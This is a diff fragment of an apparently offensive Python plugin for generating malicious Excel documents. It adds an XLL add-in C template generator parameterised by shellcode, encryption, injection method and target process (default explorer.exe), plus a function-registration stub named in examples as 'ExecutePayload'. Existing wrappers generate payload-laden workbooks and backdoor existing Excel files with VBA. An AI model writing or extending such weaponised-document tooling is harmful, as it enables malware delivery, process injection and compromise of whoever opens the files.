+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
+    switch (fdwReason) {{
+        case DLL_PROCESS_ATTACH:
+            /* Initialize */
+            break;
+        case DLL_PROCESS_DETACH:
+            /* Cleanup */
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        default:
+            break;
+    }}
+    return TRUE;
+}}
+'''
+        return xll_template
+
+    def register_xll_function(self, function_name, function_macro):
+        """
+        Create a function registration helper for XLL.
+        XLL functions must be registered to appear in Excel's function wizard.
+        
+        Args:
+            function_name (str): Name of function (e.g., "ExecutePayload")
+            function_macro (str): Macro/function signature
+            
+        Returns:
+            str: C code for function registration
+        """
+        
+        registration_code = f'''/* Function: {function_name} */
+__declspec(dllexport) LPXLOPER __cdecl {function_name}(void) {{
+    static XLOPER xResult;
+    xResult.xltype = xltypeNum;
+    xResult.val.num = 0;
+    return &xResult;
+}}
+'''
+        return registration_code
+
 
 # Instantiate plugin
 _plugin = PayloadMalDocsPlugin()
 
 # Register plugin functions
-def generate_excel_payload(payload_path, vba_payload, output_path=None):
+def generate_excel_payload(payload_path, vba_payload, output_path=None, template_path=None):
     """Generate a malicious Excel document with embedded payload."""
-    return _plugin.generate_excel_payload(payload_path, vba_payload, output_path)
+    return _plugin.generate_excel_payload(payload_path, vba_payload, output_path, template_path)
 
 def backdoor_existing_excel(source_excel, vba_payload, output_path=None):
     """Backdoor an existing Excel file with VBA payload."""
@@ -1546,6 +1979,14 @@ def export_vba_as_bas(vba_code, output_path, module_name="Payload"):
 def validate():
     """Validate plugin dependencies."""
     return _plugin.validate()
+
+def generate_xll_template(shellcode_hex, encryption_type="XOR", injection_method="CreateThread", target_process="explorer.exe", guardrail_includes="", guardrail_code=""):
+    """Generate C/C++ XLL (Excel Add-In) source code."""
+    return _plugin.generate_xll_template(shellcode_hex, encryption_type, injection_method, target_process, guardrail_includes, guardrail_code)
+
+def register_xll_function(function_name, function_macro):
+    """Register an XLL function for Excel."""
+    return _plugin.register_xll_function(function_name, function_macro)
 
 
 # Test block for standalone execution
